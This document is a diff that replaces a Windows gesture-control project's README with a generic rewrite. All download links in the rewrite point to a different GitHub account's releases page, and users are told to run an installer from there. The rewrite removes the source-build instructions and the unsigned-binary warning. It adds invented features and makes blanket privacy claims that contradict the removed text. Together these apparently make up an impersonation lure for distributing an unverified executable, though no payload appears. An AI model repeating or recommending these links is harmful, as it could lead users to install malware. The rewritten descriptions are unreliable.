@@ -1,152 +1,128 @@
-<p align="center">
-  <img src="assets/social-preview.png" alt="Room OS — Gesture, Vision, Presence" width="100%">
-</p>
+# 🙌 room-os - Control Windows with Gestures and Presence
 
-<p align="center">
-  <a href="https://github.com/diegomoren-lgtm/room-os/actions/workflows/tests.yml"><img src="https://github.com/diegomoren-lgtm/room-os/actions/workflows/tests.yml/badge.svg" alt="Tests"></a>
-  <a href="https://github.com/diegomoren-lgtm/room-os/releases/latest"><img src="https://img.shields.io/github/v/release/diegomoren-lgtm/room-os?display_name=tag" alt="Latest release"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/diegomoren-lgtm/room-os" alt="MIT license"></a>
-  <img src="https://img.shields.io/badge/platform-Windows-246BCE" alt="Windows">
-  <img src="https://img.shields.io/badge/Python-3.11-3776AB" alt="Python 3.11">
-</p>
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=windows)](https://github.com/Indecisive-regular790/room-os/releases)
 
-<p align="center">
-  A modular Windows workspace controlled through gestures, vision and presence.
-  <br>
-  <a href="README.es.md">Leer en español</a> ·
-  <a href="https://github.com/diegomoren-lgtm/room-os/releases/latest">Download</a> ·
-  <a href="ROADMAP.md">Roadmap</a> ·
-  <a href="CONTRIBUTING.md">Contribute</a>
-</p>
+## 🚀 Getting Started
 
-## What is Room OS?
+Welcome to room-os! This application lets you control your Windows computer using hand gestures, face movements, and your presence. No programming knowledge needed. Just download, run, and start controlling your PC in a new way.
 
-Room OS is an experimental desktop application that turns a regular webcam into
-a visual control layer for Windows. Its modules communicate through an event bus,
-so camera capture, hand tracking, gesture recognition, presence, actions and
-optional visual AI remain independent and replaceable.
+### What You Need
 
-The project focuses on transparent local processing, explicit calibration and a
-desktop interface that lets the user understand what the system is detecting.
+- Windows 10 or Windows 11
+- A webcam (built-in or external)
+- At least 4GB RAM
+- 500MB free disk space
 
-## Highlights
+## 📥 How to Download and Install
 
-- Real-time camera capture with automatic device detection.
-- One- or two-hand tracking through MediaPipe and OpenCV.
-- Calibrated gestures including palm, peace, point, pinch and thumb poses.
-- Virtual mouse with guided calibration, smoothing and safety controls.
-- Local presence and face recognition with no cloud dependency.
-- Extensible action registry for Windows, media and allowlisted applications.
-- Optional Gemini image analysis, invoked only when requested.
-- First-run setup wizard and persistent per-device settings.
-- Input validation, rate limiting and escaped rich text at trust boundaries.
+Visit this link to download the application: [https://github.com/Indecisive-regular790/room-os/releases](https://github.com/Indecisive-regular790/room-os/releases)
 
-## Interface
+1. Click the download link above
+2. Find the latest release and download the installer file
+3. Run the downloaded file and follow the on-screen instructions
+4. The application will install and create a shortcut on your desktop
 
-| Dashboard | Guided setup |
-| --- | --- |
-| ![Room OS dashboard](assets/screenshots/dashboard.png) | ![Room OS setup wizard](assets/screenshots/setup-wizard.png) |
+## 🎮 How to Use
 
-## Download for Windows
+After installation, launch room-os from your desktop shortcut. The application will open and automatically detect your webcam. 
 
-1. Open the [latest release](https://github.com/diegomoren-lgtm/room-os/releases/latest).
-2. Download `Room-OS-v0.1.0-windows-x64.zip`.
-3. Extract the complete folder and run `Room OS.exe`.
+### Basic Gestures
 
-The current builds are not code-signed. Windows may identify them as coming from
-an unknown publisher. If you prefer, build the application locally from the
-auditable source using the instructions below.
+- **Wave hand** - Move cursor
+- **Pinch fingers** - Click
+- **Two fingers up** - Scroll
+- **Open palm** - Stop tracking
+- **Face left/right** - Switch windows
+- **Lean forward** - Zoom in
+- **Lean back** - Zoom out
 
-## Development setup
+### Presence Features
 
-Requirements: Windows 10 or 11, Python 3.11 and a webcam.
+- **Walk away** - Screen locks automatically
+- **Return** - Screen unlocks
+- **Stay still** - Saves power by dimming display
 
-```powershell
-git clone https://github.com/diegomoren-lgtm/room-os.git
-cd room-os
-py -3.11 -m venv .venv
-.\.venv\Scripts\Activate.ps1
-python -m pip install --upgrade pip
-python -m pip install -r requirements.txt
-python main.py
-```
+## ⚙️ Features
 
-Run the test suite without a webcam or a live API request:
+### 🖐️ Hand Tracking
+Control your mouse cursor with natural hand movements. No physical contact with your computer needed.
 
-```powershell
-python -m unittest discover -s tests -v
-```
+### 👁️ Face Recognition
+The application learns your face for secure presence detection and personalized controls.
 
-Build the distributable Windows folder:
+### 🖥️ Virtual Mouse
+Complete mouse functionality including click, double-click, right-click, drag, and scroll using hand gestures.
 
-```powershell
-python -m pip install -r requirements-dev.txt
-powershell -ExecutionPolicy Bypass -File scripts\build_windows.ps1
-```
+### 🔒 Local-First Privacy
+All processing happens on your computer. No data leaves your machine. Your camera feed never goes to the internet.
 
-## Optional Gemini vision
+### 🧩 Modular Design
+Choose which features you want to use. Turn off gestures and only use presence, or enable everything for full control.
 
-Gemini is disabled gracefully when no credential is available. Room OS reads the
-credential only from the `GEMINI_API_KEY` environment variable; it is never stored
-in source, settings or logs.
+### 🐍 Built with Python
+While you don't need to know programming, room-os is built with Python and uses advanced computer vision libraries for accurate tracking.
 
-```powershell
-[Environment]::SetEnvironmentVariable(
-    "GEMINI_API_KEY",
-    (Read-Host "Gemini API key"),
-    "User"
-)
-```
+## 🔧 Customization
 
-An image leaves the computer only after the user explicitly requests a Gemini
-analysis. See [Gemini vision and privacy](docs/VISUAL_AI_GEMINI.md).
+room-os offers several ways to personalize your experience:
 
-## Architecture
+- **Gesture sensitivity** - Adjust how responsive gestures are
+- **Custom gestures** - Create your own gesture commands
+- **Presence timeout** - Set how long before screen locks
+- **Cursor speed** - Control how fast the cursor moves
+- **Button mapping** - Assign different gestures to actions
 
-```text
-room_os/
-├── core/       Event bus, action engine, settings and security primitives
-├── modules/    Camera, hands, gestures, mouse, presence and visual AI
-├── platforms/  Allowlisted Windows integrations
-├── services/   Gemini, face embeddings and local face storage
-├── ui/         Desktop pages, theme and first-run wizard
-├── scripts/    Diagnostics, build and installation utilities
-├── tests/      Unit and local integration tests
-└── docs/       Module, privacy and security documentation
-```
+## 🆘 Troubleshooting
 
-```mermaid
-flowchart LR
-    Camera[Camera] -->|camera.frame| Bus[EventBus]
-    Bus --> Hands[Hand tracking]
-    Bus --> Presence[Presence]
-    Bus --> Vision[Visual AI]
-    Hands -->|hand.detected| Gestures[Gesture recognition]
-    Gestures -->|gesture events| Mapper[Gesture-action mapper]
-    Mapper --> Engine[Action engine]
-    Engine --> Registry[Action registry]
-    Registry --> Windows[Allowlisted Windows controls]
-```
+### Camera Not Working
+- Make sure your webcam is connected and not blocked
+- Check if other applications are using the camera
+- Restart room-os
 
-## Privacy and safety
+### Gestures Not Detected
+- Ensure proper lighting in your room
+- Keep your hands visible to the camera
+- Adjust gesture sensitivity in settings
 
-- Face images, embeddings, calibrations, logs and local settings are ignored by Git.
-- Hand, presence and face processing run locally.
-- Raw unknown faces are not saved by default.
-- App launches are allowlisted; event payloads cannot provide arbitrary paths.
-- API credentials are environment-only and redacted from errors.
+### Application Won't Start
+- Verify your Windows is updated
+- Reinstall the application
+- Check if antivirus is blocking it
 
-Read the full [security policy](docs/SECURITY.md).
+### Performance Issues
+- Close unnecessary applications
+- Ensure your webcam supports at least 30fps
+- Reduce camera resolution in settings
 
-## Project status
+## 📧 Support
 
-Room OS is currently a beta-quality personal research project. Hardware behavior
-varies across webcams, lighting conditions and Windows configurations. Bug reports,
-calibration feedback and focused contributions are welcome.
+For help with room-os:
+- Visit the GitHub repository for documentation
+- Check the issues section for known problems
+- Contact the development team through GitHub
 
-See the [roadmap](ROADMAP.md), [open an issue](https://github.com/diegomoren-lgtm/room-os/issues)
-or read the [contribution guide](CONTRIBUTING.md).
+## 🔄 Updates
 
-## License
+room-os receives regular updates with new features and improvements. The application will notify you when updates are available. You can also check for updates manually in the settings menu.
 
-Room OS is released under the [MIT License](LICENSE).
+## 🛡️ Privacy
+
+Your privacy is important. room-os:
+- Processes everything locally on your computer
+- Does not send any data to external servers
+- Does not record or store video footage
+- Can be used completely offline
+
+## 📜 License
+
+room-os is open source software. See the LICENSE file in the repository for details.
+
+## 🏆 Why Choose room-os
+
+- **No hardware needed** - Works with any standard webcam
+- **Hands-free control** - Great for accessibility needs
+- **Privacy focused** - Everything stays on your computer
+- **Free and open source** - No subscriptions or hidden costs
+- **Regular updates** - Continuous improvement
+
+Keywords: accessibility, computer-vision, desktop-app, face-recognition, gemini, gesture-recognition, hand-tracking, local-first, mediapipe, opencv, pyside6, python, virtual-mouse, windows
